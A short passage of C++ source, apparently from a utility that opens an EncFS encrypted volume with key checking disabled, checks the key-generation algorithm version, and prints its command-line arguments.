			cout << "- The tested key generation algorithms do not match that of the version used to create the volume (\"" << config.get()->creator << "\")\n";
			return EXIT_FAILURE;
		}
	}




	/* Obtain more info */
	std::shared_ptr<EncFS_Opts> opts(new EncFS_Opts());
	opts->rootDir = rootDir;
	opts->createIfNotFound = false;
	opts->checkKey = false;
	opts->volumeKeyData = (unsigned char *) malloc(48);
	opts->volumeKeyLen = 48;
	RootPtr rootPtr = initFS(ctx.get(), opts);
	if (!rootPtr) {
		cerr << "Unable to open " << rootDir << " as an EncFS volume\n";
		return EXIT_FAILURE;
	}




	printf("Args: #%d\n", argc);
	for (int i = 0; i < argc; i++) {
		printf("%d: %s\n", i, argv[i]);
	}
}
